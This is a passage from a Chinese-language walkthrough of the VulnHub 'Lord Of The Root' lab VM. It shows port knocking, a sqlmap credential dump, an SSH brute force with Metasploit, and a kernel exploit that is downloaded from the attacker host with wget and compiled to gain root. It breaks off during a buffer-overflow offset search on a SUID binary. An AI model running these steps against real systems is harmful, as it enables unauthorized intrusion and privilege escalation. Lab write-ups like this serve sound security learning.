\/</span></span><br><span class="line"><span class="string">Easy as 1,2,3</span></span><br><span class="line"><span class="string">Enter passphrase for key &#x27;</span>/root/.ssh/id_rsa<span class="string">&#x27;: </span></span><br><span class="line"><span class="string">root@192.168.56.113&#x27;</span>s password:</span><br></pre></td></tr></table></figure>

<p>当搜索SSH时，它说<code>Knock Friend To Enter&#39;&#39;和</code>Easy as 123’’，然后要求输入我们不知道的密码。现在，这暗示着端口碰撞。试试看：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nmap -r -Pn -p 1,2,3 192.168.56.113 -v</span></span><br><span class="line">PORT  STATE    SERVICE</span><br><span class="line">1/tcp filtered tcpmux</span><br><span class="line">2/tcp filtered compressnet</span><br><span class="line">3/tcp filtered compressnet</span><br><span class="line">MAC Address: 08:00:27:0B:D4:69 (Oracle VirtualBox virtual NIC)</span><br></pre></td></tr></table></figure>

<p>现在再次启动nmap扫描。希望这次的结果中有多个端口。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nmap -p- -A -v 192.168.56.113 --min-rate=10000</span></span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">22/tcp   open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.3 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   1024 3c:3d:e3:8e:35:f9:da:74:20:ef:aa:49:4a:1d:ed:dd (DSA)</span><br><span class="line">|   2048 85:94:6c:87:c9:a8:35:0f:2c:db:bb:c1:3f:2a:50:c1 (RSA)</span><br><span class="line">|   256 f3:<span class="built_in">cd</span>:aa:1d:05:f2:1e:8c:61:87:25:b6:f4:34:45:37 (ECDSA)</span><br><span class="line">|_  256 34:ec:16:dd:a7:cf:2a:86:45:ec:65:ea:05:43:89:21 (ED25519)</span><br><span class="line">1337/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Supported Methods: GET HEAD POST OPTIONS</span><br><span class="line">|_http-server-header: Apache/2.4.7 (Ubuntu)</span><br><span class="line">|_http-title: Site doesn<span class="string">&#x27;t have a title (text/html).</span></span><br></pre></td></tr></table></figure>

<p>如所见，与我们之前的扫描相比，还有一个开放的端口，即1337，它有HTTP服务，这就是想要的，因为默认情况下80端口没有打开。让我们通过此端口打开目标IP。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://192.168.56.113:1337/</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub183.jpg"></p>
<p>如上所示，打开的页面仅包含一张图片，然后还检查了其源代码，但没有任何线索。通常，总是有一些将robots.txt文件放入网络目录的机会，因此，在渗透任何系统时，都应始终检查robots.txt文件。在这里，已经在地址192.168.56.113:1337/robots.txt中对robots.txt进行了测试，将打开一个新的网页，显示以下图片。</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub184.jpg"></p>
<h3 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h3><p>之后，我们查看了其源代码并找到了base64的编码值。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;img src=<span class="string">&quot;/images/hipster.jpg&quot;</span> align=<span class="string">&quot;middle&quot;</span>&gt;</span><br><span class="line">&lt;!--THprM09ETTBOVEl4TUM5cGJtUmxlQzV3YUhBPSBDbG9zZXIh&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>解码</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># echo &quot;THprM09ETTBOVEl4TUM5cGJtUmxlQzV3YUhBPSBDbG9zZXIh&quot; | base64 -d</span></span><br><span class="line">Lzk3ODM0NTIxMC9pbmRleC5waHA= Closer!root@kali:~<span class="comment"># echo &quot;Lzk3ODM0NTIxMC9pbmRleC5waHA=&quot; | base64 -d</span></span><br><span class="line">/978345210/index.php</span><br></pre></td></tr></table></figure>

<p>访问以下的url</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://192.168.56.113:1337/978345210/index.php</span><br></pre></td></tr></table></figure>

<p>现在，有一个登录口。尝试SQL注入的帮助下登录，使用sqlmap。<br>由于不知道确切的用户名和密码，因此，使用SQLMAP进行基于登录表单的注入，通过执行以下命令来检索数据库名称和登录凭据。</p>
<p>时间盲注，好慢。。。最后，显示用户名和密码。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># sqlmap -u &quot;http://192.168.56.113:1337/978345210/index.php&quot; --forms -D Webapp -T Users --dump --batch</span></span><br><span class="line">Database: Webapp</span><br><span class="line">Table: Users</span><br><span class="line">[5 entries]</span><br><span class="line">+----+------------------+----------+</span><br><span class="line">| id | password         | username |</span><br><span class="line">+----+------------------+----------+</span><br><span class="line">| 1  | iwilltakethering | frodo    |</span><br><span class="line">| 2  | MyPreciousR00t   | smeagol  |</span><br><span class="line">| 3  | AndMySword       | aragorn  |</span><br><span class="line">| 4  | AndMyBow         | legolas  |</span><br><span class="line">| 5  | AndMyAxe         | gimli    |</span><br><span class="line">+----+------------------+----------+</span><br></pre></td></tr></table></figure>

<p>将所有这些用户名和密码保存在两个不同的文本文件中。并借助方法在SSH登录暴力破解使用此文本文件。执行攻击，请转到Kali的终端并通过键入msfdb run并进一步键入来打开Metasploit：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~/vulnhub/lordoftheroot<span class="comment"># msfdb run</span></span><br><span class="line">[+] Starting database</span><br><span class="line">                                                  </span><br><span class="line"></span><br><span class="line">      .:okOOOkdc<span class="string">&#x27;           &#x27;</span>cdkOOOko:.                                                                                    </span><br><span class="line">    .xOOOOOOOOOOOOc       cOOOOOOOOOOOOx.                                                                                  </span><br><span class="line">   :OOOOOOOOOOOOOOOk,   ,kOOOOOOOOOOOOOOO:                                                                                 </span><br><span class="line">  <span class="string">&#x27;OOOOOOOOOkkkkOOOOO: :OOOOOOOOOOOOOOOOOO&#x27;</span>                                                                                </span><br><span class="line">  oOOOOOOOO.MMMM.oOOOOoOOOOl.MMMM,OOOOOOOOo                                                                                </span><br><span class="line">  dOOOOOOOO.MMMMMM.cOOOOOc.MMMMMM,OOOOOOOOx                                                                                </span><br><span class="line">  lOOOOOOOO.MMMMMMMMM;d;MMMMMMMMM,OOOOOOOOl                                                                                </span><br><span class="line">  .OOOOOOOO.MMM.;MMMMMMMMMMM;MMMM,OOOOOOOO.                                                                                </span><br><span class="line">   cOOOOOOO.MMM.OOc.MMMMM<span class="string">&#x27;oOO.MMM,OOOOOOOc                                                                                 </span></span><br><span class="line"><span class="string">    oOOOOOO.MMM.OOOO.MMM:OOOO.MMM,OOOOOOo                                                                                  </span></span><br><span class="line"><span class="string">     lOOOOO.MMM.OOOO.MMM:OOOO.MMM,OOOOOl                                                                                   </span></span><br><span class="line"><span class="string">      ;OOOO&#x27;</span>MMM.OOOO.MMM:OOOO.MMM;OOOO;                                                                                    </span><br><span class="line">       .dOOo<span class="string">&#x27;WM.OOOOocccxOOOO.MX&#x27;</span>xOOd.                                                                                     </span><br><span class="line">         ,kOl<span class="string">&#x27;M.OOOOOOOOOOOOO.M&#x27;</span>dOk,                                                                                       </span><br><span class="line">           :kk;.OOOOOOOOOOOOO.;Ok:                                                                                         </span><br><span class="line">             ;kOOOOOOOOOOOOOOOk:                                                                                           </span><br><span class="line">               ,xOOOOOOOOOOOx,                                                                                             </span><br><span class="line">                 .lOOOOOOOl.                                                                                               </span><br><span class="line">                    ,dOd,                                                                                                  </span><br><span class="line">                      .                                                                                                    </span><br><span class="line"></span><br><span class="line">       =[ metasploit v5.0.69-dev                          ]</span><br><span class="line">+ -- --=[ 1959 exploits - 1094 auxiliary - 336 post       ]</span><br><span class="line">+ -- --=[ 562 payloads - 45 encoders - 10 nops            ]</span><br><span class="line">+ -- --=[ 7 evasion                                       ]</span><br><span class="line"></span><br><span class="line">msf5 &gt; use auxiliary/scanner/ssh/ssh_login</span><br><span class="line">msf5 auxiliary(scanner/ssh/ssh_login) &gt; <span class="built_in">set</span> rhosts 192.168.56.113</span><br><span class="line">rhosts =&gt; 192.168.56.113</span><br><span class="line">msf5 auxiliary(scanner/ssh/ssh_login) &gt; <span class="built_in">set</span> user_file /root/vulnhub/lordoftheroot/user.txt</span><br><span class="line">user_file =&gt; /root/vulnhub/lordoftheroot/user.txt</span><br><span class="line">msf5 auxiliary(scanner/ssh/ssh_login) &gt; <span class="built_in">set</span> pass_file /root/vulnhub/lordoftheroot/pass.txt</span><br><span class="line">pass_file =&gt; /root/vulnhub/lordoftheroot/pass.txt</span><br><span class="line">msf5 auxiliary(scanner/ssh/ssh_login) &gt; <span class="built_in">set</span> stop_on_success <span class="literal">true</span></span><br><span class="line">stop_on_success =&gt; <span class="literal">true</span></span><br><span class="line">msf5 auxiliary(scanner/ssh/ssh_login) &gt; exploit</span><br><span class="line"></span><br><span class="line">[+] 192.168.56.113:22 - Success: <span class="string">&#x27;smeagol:MyPreciousR00t&#x27;</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line">[*] Command shell session 1 opened (192.168.56.102:43037 -&gt; 192.168.56.113:22) at 2020-01-25 12:36:48 -0500</span><br><span class="line">[*] Scanned 1 of 1 hosts (100% complete)</span><br><span class="line">[*] Auxiliary module execution completed</span><br></pre></td></tr></table></figure>

<p>得到正确的用户名和密码</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">smeagol/MyPreciousR00t</span><br></pre></td></tr></table></figure>

<p>此外，Metasploit通过提供远程系统命令shell（未经授权访问受害者系统）提供了额外的好处。现在开始渗透访问root权限。然后，要访问适当的TTY Shell，键入以下python一行脚本：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msf5 auxiliary(scanner/ssh/ssh_login) &gt; sessions 1</span><br><span class="line">[*] Starting interaction with 1...</span><br><span class="line"></span><br><span class="line">Welcome to Ubuntu 14.04.3 LTS (GNU/Linux 3.19.0-25-generic i686)</span><br><span class="line"></span><br><span class="line"> * Documentation:  https://help.ubuntu.com/</span><br><span class="line"></span><br><span class="line">                            .____    _____________________________                              </span><br><span class="line">                            |    |   \_____  \__    ___/\______   \                             </span><br><span class="line">                            |    |    /   |   \|    |    |       _/                             </span><br><span class="line">                            |    |___/    |    \    |    |    |   \                             </span><br><span class="line">                            |_______ \_______  /____|    |____|_  /                             </span><br><span class="line">                                    \/       \/                 \/                              </span><br><span class="line"> __      __       .__                                ___________      .__                   .___</span><br><span class="line">/  \    /  \ ____ |  |   ____  ____   _____   ____   \_   _____/______|__| ____   ____    __| _/</span><br><span class="line">\   \/\/   // __ \|  | _/ ___\/  _ \ /     \_/ __ \   |    __) \_  __ \  |/ __ \ /    \  / __ | </span><br><span class="line"> \        /\  ___/|  |_\  \__(  &lt;_&gt; )  Y Y  \  ___/   |     \   |  | \/  \  ___/|   |  \/ /_/ | </span><br><span class="line">  \__/\  /  \___  &gt;____/\___  &gt;____/|__|_|  /\___  &gt;  \___  /   |__|  |__|\___  &gt;___|  /\____ | </span><br><span class="line">       \/       \/          \/            \/     \/       \/                  \/     \/      \/ </span><br><span class="line">python -c <span class="string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br><span class="line">smeagol@LordOfTheRoot:~$ id</span><br><span class="line">id</span><br><span class="line">uid=1000(smeagol) gid=1000(smeagol) groups=1000(smeagol)</span><br><span class="line">smeagol@LordOfTheRoot:~$ whoami</span><br><span class="line">whoami</span><br><span class="line">smeagol</span><br><span class="line">smeagol@LordOfTheRoot:~$</span><br></pre></td></tr></table></figure>

<h3 id="提权1-搜索exploit来提权"><a href="#提权1-搜索exploit来提权" class="headerlink" title="提权1:搜索exploit来提权"></a>提权1:搜索exploit来提权</h3><p>到达终端。在这里，键入以下命令以了解内核的版本：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">smeagol@LordOfTheRoot:~$ lsb_release -a</span><br><span class="line">lsb_release -a</span><br><span class="line">No LSB modules are available.</span><br><span class="line">Distributor ID: Ubuntu</span><br><span class="line">Description:    Ubuntu 14.04.3 LTS</span><br><span class="line">Release:        14.04</span><br><span class="line">Codename:       trusty</span><br></pre></td></tr></table></figure>

<p>版本是14.04，幸运的是，对此版本有一个exploit。在Kali终端中，搜索以下类型的漏洞：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># searchsploit ubuntu 14.04</span></span><br><span class="line">---------------------------------------------------------------------------------- ----------------------------------------</span><br><span class="line"> Exploit Title                                                                    |  Path</span><br><span class="line">                                                                                  | (/usr/share/exploitdb/)</span><br><span class="line">---------------------------------------------------------------------------------- ----------------------------------------</span><br><span class="line">Apport (Ubuntu 14.04/14.10/15.04) - Race Condition Privilege Escalation           | exploits/linux/<span class="built_in">local</span>/37088.c</span><br><span class="line">Apport 2.14.1 (Ubuntu 14.04.2) - Local Privilege Escalation                       | exploits/linux/<span class="built_in">local</span>/36782.sh</span><br><span class="line">Linux Kernel (Debian 7.7/8.5/9.0 / Ubuntu 14.04.2/16.04.2/17.04 / Fedora 22/25 /  | exploits/linux_x86-64/<span class="built_in">local</span>/42275.c</span><br><span class="line">Linux Kernel (Debian 9/10 / Ubuntu 14.04.5/16.04.2/17.04 / Fedora 23/24/25) - <span class="string">&#x27;ld | exploits/linux_x86/local/42276.c</span></span><br><span class="line"><span class="string">Linux Kernel (Ubuntu 14.04.3) - &#x27;</span>perf_event_open()<span class="string">&#x27; Can Race with execve() (Acces | exploits/linux/local/39771.txt</span></span><br><span class="line"><span class="string">Linux Kernel 3.13.0 &lt; 3.19 (Ubuntu 12.04/14.04/14.10/15.04) - &#x27;</span>overlayfs<span class="string">&#x27; Local P | exploits/linux/local/37292.c</span></span><br><span class="line"><span class="string">Linux Kernel 3.13.0 &lt; 3.19 (Ubuntu 12.04/14.04/14.10/15.04) - &#x27;</span>overlayfs<span class="string">&#x27; Local P | exploits/linux/local/37293.txt</span></span><br><span class="line"><span class="string">Linux Kernel 3.x (Ubuntu 14.04 / Mint 17.3 / Fedora 22) - Double-free usb-midi SM | exploits/linux/local/41999.txt</span></span><br><span class="line"><span class="string">Linux Kernel 4.3.3 (Ubuntu 14.04/15.10) - &#x27;</span>overlayfs<span class="string">&#x27; Local Privilege Escalation  | exploits/linux/local/39166.c</span></span><br><span class="line"><span class="string">Linux Kernel 4.4.0 (Ubuntu 14.04/16.04 x86-64) - &#x27;</span>AF_PACKET<span class="string">&#x27; Race Condition Privi | exploits/linux_x86-64/local/40871.c</span></span><br><span class="line"><span class="string">Linux Kernel 4.4.0-21 &lt; 4.4.0-51 (Ubuntu 14.04/16.04 x86-64) - &#x27;</span>AF_PACKET<span class="string">&#x27; Race C | exploits/linux/local/47170.c</span></span><br><span class="line"><span class="string">Linux Kernel &lt; 4.4.0-83 / &lt; 4.8.0-58 (Ubuntu 14.04/16.04) - Local Privilege Escal | exploits/linux/local/43418.c</span></span><br><span class="line"><span class="string">Linux Kernel &lt; 4.4.0/ &lt; 4.8.0 (Ubuntu 14.04/16.04 / Linux Mint 17/18 / Zorin) - L | exploits/linux/local/47169.c</span></span><br><span class="line"><span class="string">NetKit FTP Client (Ubuntu 14.04) - Crash/Denial of Service (PoC)                  | exploits/linux/dos/37777.txt</span></span><br><span class="line"><span class="string">Ubuntu 14.04/15.10 - User Namespace Overlayfs Xattr SetGID Privilege Escalation   | exploits/linux/local/41762.txt</span></span><br><span class="line"><span class="string">WebKitGTK 2.1.2 (Ubuntu 14.04) - Heap based Buffer Overflow                       | exploits/linux/local/44204.md</span></span><br><span class="line"><span class="string">usb-creator 0.2.x (Ubuntu 12.04/14.04/14.10) - Local Privilege Escalation         | exploits/linux/local/36820.txt</span></span><br><span class="line"><span class="string">---------------------------------------------------------------------------------- ----------------------------------------</span></span><br><span class="line"><span class="string">Shellcodes: No Result</span></span><br></pre></td></tr></table></figure>

<p>选下面这个exploit，当然，自己也可以去尝试其他的exploit，我这里为了节约时间就不演示了。。。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Linux Kernel 4.3.3 (Ubuntu 14.04/15.10) - <span class="string">&#x27;overlayfs&#x27;</span> Local Privilege Escalation  | exploits/linux/<span class="built_in">local</span>/39166.c</span><br></pre></td></tr></table></figure>

<p>借助cp命令将漏洞exploit复制到当前目录，然后运行HTTP python服务器将其转移到目标计算机中。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~/vulnhub/lordoftheroot<span class="comment"># cp /usr/share/exploitdb/exploits/linux/local/39166.c .</span></span><br><span class="line">root@kali:~/vulnhub/lordoftheroot<span class="comment"># ls</span></span><br><span class="line">39166.c  pass.txt  user.txt</span><br><span class="line">root@kali:~/vulnhub/lordoftheroot<span class="comment"># python -m SimpleHTTPServer </span></span><br><span class="line">Serving HTTP on 0.0.0.0 port 8000 ...</span><br></pre></td></tr></table></figure>

<p>在shell中编译exp，然后赋予权限，运行生成的exp进行提权，可以看到提权成功，非常的简单</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">smeagol@LordOfTheRoot:~$ wget http://192.168.56.102:8000/39166.c</span><br><span class="line">wget http://192.168.56.102:8000/39166.c</span><br><span class="line">--2020-01-25 18:52:13--  http://192.168.56.102:8000/39166.c</span><br><span class="line">Connecting to 192.168.56.102:8000... connected.</span><br><span class="line">HTTP request sent, awaiting response... 200 OK</span><br><span class="line">Length: 2789 (2.7K) [text/plain]</span><br><span class="line">Saving to: ‘39166.c’</span><br><span class="line"></span><br><span class="line">100%[======================================&gt;] 2,789       --.-K/s   <span class="keyword">in</span> 0s      </span><br><span class="line"></span><br><span class="line">2020-01-25 18:52:13 (575 MB/s) - ‘39166.c’ saved [2789/2789]</span><br><span class="line"></span><br><span class="line">smeagol@LordOfTheRoot:~$ gcc 39166.c -o exp</span><br><span class="line">gcc 39166.c -o exp</span><br><span class="line">smeagol@LordOfTheRoot:~$ chmod 777 exp</span><br><span class="line">chmod 777 exp</span><br><span class="line">smeagol@LordOfTheRoot:~$ ./exp</span><br><span class="line">./exp</span><br><span class="line">root@LordOfTheRoot:~<span class="comment"># id</span></span><br><span class="line">id</span><br><span class="line">uid=0(root) gid=1000(smeagol) groups=0(root),1000(smeagol)</span><br><span class="line">root@LordOfTheRoot:~<span class="comment"># whoami</span></span><br><span class="line">whoami</span><br><span class="line">root</span><br></pre></td></tr></table></figure>

<p>最后找到flag，挑战结束</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@LordOfTheRoot:/root<span class="comment"># cat Flag.txt</span></span><br><span class="line">cat Flag.txt</span><br><span class="line">“There is only one Lord of the Ring, only one who can bend it to his will. And he does not share power.”</span><br><span class="line">– Gandalf</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub185.jpg"></p>
<h3 id="提权2-利用SUID利用root拥有的二进制文件来获得root"><a href="#提权2-利用SUID利用root拥有的二进制文件来获得root" class="headerlink" title="提权2:利用SUID利用root拥有的二进制文件来获得root"></a>提权2:利用SUID利用root拥有的二进制文件来获得root</h3><p>导航到root目录，看到一个名为“SECRET”的目录。在此目录中，有3个“doors”，每个都有一个名为“file”的文件：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">smeagol@LordOfTheRoot:/$ <span class="built_in">cd</span> SECRET</span><br><span class="line"><span class="built_in">cd</span> SECRET</span><br><span class="line">smeagol@LordOfTheRoot:/SECRET$ ls</span><br><span class="line">ls</span><br><span class="line">door1  door2  door3</span><br><span class="line">smeagol@LordOfTheRoot:/SECRET$ ls -lahR</span><br><span class="line">ls -lahR</span><br><span class="line">.:</span><br><span class="line">total 20K</span><br><span class="line">drwxr-xr-x  5 root root 4.0K Sep 22  2015 .</span><br><span class="line">drwxr-xr-x 23 root root 4.0K Sep 22  2015 ..</span><br><span class="line">drwxr-xr-x  2 root root 4.0K Jan 25 19:15 door1</span><br><span class="line">drwxr-xr-x  2 root root 4.0K Jan 25 19:15 door2</span><br><span class="line">drwxr-xr-x  2 root root 4.0K Jan 25 19:15 door3</span><br><span class="line"></span><br><span class="line">./door1:</span><br><span class="line">total 16K</span><br><span class="line">drwxr-xr-x 2 root root 4.0K Jan 25 19:15 .</span><br><span class="line">drwxr-xr-x 5 root root 4.0K Sep 22  2015 ..</span><br><span class="line">-rwsr-xr-x 1 root root 7.2K Sep 17  2015 file</span><br><span class="line"></span><br><span class="line">./door2:</span><br><span class="line">total 16K</span><br><span class="line">drwxr-xr-x 2 root root 4.0K Jan 25 19:15 .</span><br><span class="line">drwxr-xr-x 5 root root 4.0K Sep 22  2015 ..</span><br><span class="line">-rwsr-xr-x 1 root root 7.2K Sep 17  2015 file</span><br><span class="line"></span><br><span class="line">./door3:</span><br><span class="line">total 16K</span><br><span class="line">drwxr-xr-x 2 root root 4.0K Jan 25 19:15 .</span><br><span class="line">drwxr-xr-x 5 root root 4.0K Sep 22  2015 ..</span><br><span class="line">-rwsr-xr-x 1 root root 5.1K Sep 22  2015 file</span><br></pre></td></tr></table></figure>

<p>看到这些文件具有SUID并由Root拥有！如果可以利用这一点，那可能就是升级root的门票。检查每个文件，看到它们都是二进制可执行文件。但是,3个中的1个具有不同的sha1哈希：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">smeagol@LordOfTheRoot:/SECRET$ file door1/file door2/file door3/file</span><br><span class="line">file door1/file door2/file door3/file</span><br><span class="line">door1/file: setuid ELF 32-bit LSB  executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), <span class="keyword">for</span> GNU/Linux 2.6.24, BuildID[sha1]=364b5cbb85546e36256039ce4599eee471bfbf86, not stripped</span><br><span class="line">door2/file: setuid ELF 32-bit LSB  executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), <span class="keyword">for</span> GNU/Linux 2.6.24, BuildID[sha1]=9e50c7cacaf5cc2c78214c81f110c88e61ad0c10, not stripped</span><br><span class="line">door3/file: setuid ELF 32-bit LSB  executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), <span class="keyword">for</span> GNU/Linux 2.6.24, BuildID[sha1]=364b5cbb85546e36256039ce4599eee471bfbf86, not stripped</span><br></pre></td></tr></table></figure>

<p>根据以前的经验，最好使用与其他2不同的二进制文件。此外，注意到在设置了一定时间后，二进制文件被切换到了新的door。为了解决这个问题，将文件复制到smeagol的桌面上以进行更一致的测试：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">smeagol@LordOfTheRoot:/SECRET$ cp door2/file /home/smeagol/Desktop/</span><br><span class="line">cp door2/file /home/smeagol/Desktop/</span><br><span class="line">smeagol@LordOfTheRoot:/SECRET$ ls /home/smeagol/Desktop/</span><br><span class="line">ls /home/smeagol/Desktop/</span><br><span class="line">file</span><br></pre></td></tr></table></figure>

<p>运行此文件，看到它要求用户输入字符串：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">smeagol@LordOfTheRoot:~/Desktop$ ./file</span><br><span class="line">./file</span><br><span class="line">Syntax: ./file &lt;input string&gt;</span><br><span class="line">smeagol@LordOfTheRoot:~/Desktop$ ./file A</span><br><span class="line">./file A</span><br></pre></td></tr></table></figure>

<p>看到这是vulnhub上的映像，可以假定该文件容易受到缓冲区溢出的影响。使用python来模糊文件并确认：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">smeagol@LordOfTheRoot:~/Desktop$ ./file $(python -c <span class="string">&#x27;print &quot;A&quot; * 100&#x27;</span>)</span><br><span class="line">./file $(python -c <span class="string">&#x27;print &quot;A&quot; * 100&#x27;</span>)</span><br><span class="line">smeagol@LordOfTheRoot:~/Desktop$ ./file $(python -c <span class="string">&#x27;print &quot;A&quot; * 200&#x27;</span>)</span><br><span class="line">./file $(python -c <span class="string">&#x27;print &quot;A&quot; * 200&#x27;</span>)</span><br><span class="line">Segmentation fault (core dumped)</span><br><span class="line">smeagol@LordOfTheRoot:~/Desktop$ ./file $(python -c <span class="string">&#x27;print &quot;A&quot; * 150&#x27;</span>)</span><br><span class="line">./file $(python -c <span class="string">&#x27;print &quot;A&quot; * 150&#x27;</span>)</span><br><span class="line">smeagol@LordOfTheRoot:~/Desktop$ ./file $(python -c <span class="string">&#x27;print &quot;A&quot; * 175&#x27;</span>)</span><br><span class="line">./file $(python -c <span class="string">&#x27;print &quot;A&quot; * 175&#x27;</span>)</span><br><span class="line">Segmentation fault (core dumped)</span><br><span class="line">smeagol@LordOfTheRoot:~/Desktop$ ./file $(python -c <span class="string">&#x27;print &quot;A&quot; * 160&#x27;</span>)</span><br><span class="line">./file $(python -c <span class="string">&#x27;print &quot;A&quot; * 160&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>注意到当文件接收大约175个字符时存在分段错误。<br>为了获得更准确的计数，使用metasploit中的内置ruby脚本来创建175个字符的模式字符串：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 175</span></span><br><span class="line">Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7A</span><br></pre></td></tr></table></figure>

<p>采用以下字符串并通过GDB运行它，然后运行字符串：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">smeagol@LordOfTheRoot:~/Desktop$ gdb -q ./file</span><br><span class="line">gdb -q ./file</span><br><span class="line">Reading symbols from ./file...(no debugging symbols found)...<span class="keyword">done</span>.</span><br><span class="line">(gdb) run Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7A</span><br><span class="line">&lt;8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7A                </span><br><span class="line">Starting program: /home/smeagol/Desktop/file Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7A</span><br><span class="line"></span><br><span class="line">Program received signal SIGSEGV, Segmentation fault.</span><br><span class="line">0x41376641 <span class="keyword">in</span> ?? ()</span><br></pre></td></tr></table></figure>

<p>如预期的那样，在0x41376641收到段错误。可以将此数字带回metasploit脚本，以查看它是多少个字符：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 41376641</span></span><br><span class="line">[*] Exact match at offset 171</span><br></pre></td></tr></table></figure>

<p>现在知道二进制文件将在第171个字符串处进行段错误处理，然后可以更新fuzz进行确认。通过GDB，添加171个字符A，4个字符B和其余的C。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">smeagol@LordOfTheRoot:~/Desktop$ gdb -q ./file</span><br><span class="line">gdb -q ./file</span><br><span class="line">Reading symbols from ./file...(no debugging symbols found)...<span class="keyword">done</span>.</span><br><span class="line">(gdb) run $(python -c <span class="string">&#x27;print &quot;A&quot; * 171 + &quot;B&quot; * 4 + &quot;C&quot; * 50&#x27;</span>)</span><br><span class="line">run $(python -c <span class="string">&#x27;print &quot;A&quot; * 171 + &quot;B&quot; * 4 + &quot;C&quot; * 50&#x27;</span>)</span><br><span class="line">Starting program: /home/smeagol/Desktop/file $(python -c <span class="string">&#x27;print &quot;A&quot; * 171 + &quot;B&quot; * 4 + &quot;C&quot; * 50&#x27;</span>)</span><br><span class="line"></span><br><span class="line">Program received signal SIGSEGV, Segmentation fault.</span><br><span class="line">0x42424242 <span class="keyword">in</span> ?? ()</span><br><span class="line">(gdb) info r</span><br><span class="line">info r</span><br><span class="line">eax            0x0      0</span><br><span class="line">ecx            0xbffffdd0       -1073742384</span><br><span class="line">edx            0xbffffb54       -1073743020</span><br><span class="line">ebx            0xb7fc0000       -1208221696</span><br><span class="line">esp            0xbffffb30       0xbffffb30</span><br><span class="line">ebp            0x41414141       0x41414141</span><br><span class="line">esi            0x0      0</span><br><span class="line">edi            0x0      0</span><br><span class="line">eip            0x42424242       0x42424242</span><br><span class="line">eflags         0x10202  [ IF RF ]</span><br><span class="line">cs             0x73     115</span><br><span class="line">ss             0x7b     123</span><br><span class="line">ds             0x7b     123</span><br><span class="line">es             0x7b     123</span><br><span class="line">fs             0x0      0</span><br><span class="line">gs             0x33     51</span><br></pre></td></tr></table></figure>

